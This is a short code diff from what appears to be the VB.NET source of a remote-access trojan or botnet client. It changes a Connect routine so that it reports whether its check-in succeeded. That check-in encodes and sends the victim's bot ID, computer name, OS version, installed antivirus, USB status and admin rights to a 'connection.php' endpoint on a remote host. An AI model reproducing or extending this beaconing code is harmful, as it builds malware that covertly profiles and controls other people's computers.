@@ -5,14 +5,14 @@ Namespace HTTPSocket
         Public ID As String
         Public Host As String
         Dim Socket As New WebClient
-        Public Sub Connect()
+        Public Function Connect()
             Try
                 _GET("connection.php?data=" & ENB(ID & "|BN|" & My.Computer.Name & "|BN|" & My.Computer.Info.OSFullName & "|BN|" & Form1.GetAntiVirus() & "|BN|Online" & "|BN|" & Form1.checkUSB() & "|BN|" & Form1.checkadmin))
+                Return True
             Catch ex As Exception
-
+                Return False
             End Try
-
-        End Sub
+        End Function
 
         Public Function ENB(ByRef s As String) As String
             Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
